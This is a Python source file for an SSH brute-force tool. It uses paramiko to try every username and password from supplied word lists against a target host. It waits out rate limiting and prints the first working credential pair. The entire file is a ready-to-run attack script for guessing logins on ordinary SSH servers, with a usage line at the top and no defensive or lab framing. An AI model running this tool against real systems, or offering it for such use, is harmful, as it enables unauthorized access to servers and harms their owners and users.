#python ssh_bruteforce.py [target ip] -P password.txt -U users.txt
import paramiko
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE


def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        #return True
        client.close()
        import os
        os._exit(1)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Single host username.")
    parser.add_argument("-U", "--userlist", help="File that contain list of usernames to try.")
    args = parser.parse_args()

    # check for required arguments
    if not args.host:
        print("Error: Hostname or IP Address of SSH server not provided.")
        parser.print_help()
        exit()

    # read password list file
    passwords = []
    if args.passlist:
        with open(args.passlist, "r") as f:
            passwords = [line.strip() for line in f.readlines()]

    # read user list file
    users = []
    if args.userlist:
        with open(args.userlist, "r") as f:
            users = [line.strip() for line in f.readlines()]
    elif args.user:
        users = [args.user]

    # try each combination of username and password
    for user in users:
        for password in passwords:
            is_ssh_open(args.host, user, password)


